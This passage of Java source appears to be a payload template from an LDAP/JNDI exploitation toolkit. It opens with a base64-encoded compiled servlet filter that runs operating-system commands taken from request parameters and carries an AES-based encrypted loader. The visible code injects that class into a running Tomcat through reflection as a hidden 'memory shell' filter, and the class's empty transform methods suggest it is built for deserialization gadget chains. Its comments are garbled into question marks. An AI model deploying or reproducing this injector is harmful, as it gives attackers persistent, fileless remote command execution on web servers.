Q3dBTUFBQUFBQUFHQUEwQURnQUJBQWtBRHdBUUFBRUFDQUFBQUVRQUJBQUNBQUFBRUxzQUFsa3J0d0FES2dNcXZyWUFCTEFBQUFBQ0FBa0FBQUFHQUFFQUFBQUlBQW9BQUFBV0FBSUFBQUFRQUJFQUVnQUFBQUFBRUFBVEFBNEFBUUFCQUJRQUFBQUNBQlU9BwFQDAFRAF8MAVIBUwwBVAFVAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24BAC9jb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAdpc0VtcHR5AQADKClaAQAMamF2YS9pby9GaWxlAQAJc2VwYXJhdG9yAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgp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";
                byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
            }

            filterDef.getClass().getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, clazz.getName());
            filterDef.getClass().getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, clazz.newInstance());
            standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);

            //?????? FilterMap
            //?????? Tomcat7 ??? Tomcat8 ??? FilterDef ?????????????????????????????????????????????????????????
            Class filterMapClass = null;
            try {
                filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
            } catch (ClassNotFoundException e) {
                filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            }

            //?????? addFilterMapBefore ??????????????????????????? filterMap ?????????????????????????????????????????????
            //????????????????????????????????????
            Object filterMap = filterMapClass.newInstance();
            filterMap.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
            filterMap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
            filterMap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, urlPattern);
            standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

            //?????? FilterConfig
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
            map.put(filterName, filterConfig);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
